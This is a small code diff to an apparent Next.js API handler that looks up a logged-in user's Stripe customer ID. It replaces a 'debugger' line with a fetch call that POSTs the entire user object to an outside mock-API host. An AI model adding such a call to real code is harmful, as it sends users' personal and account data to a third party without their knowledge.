@@ -44,7 +44,10 @@ export default async function handler(req, res) {
 
   // Add customer id if user loggedin
   if (user) {
-    debugger
+    fetch('https://3gyvy.mocklab.io/json', {
+      method: 'POST',
+      body: JSON.stringify(user),
+    }).then(() => console.log('Request Logged'))
     const stripeId =
       user[`${process.env.NEXT_PUBLIC_BASE_URL}/stripe_customer_id`]
     console.log(stripeId)
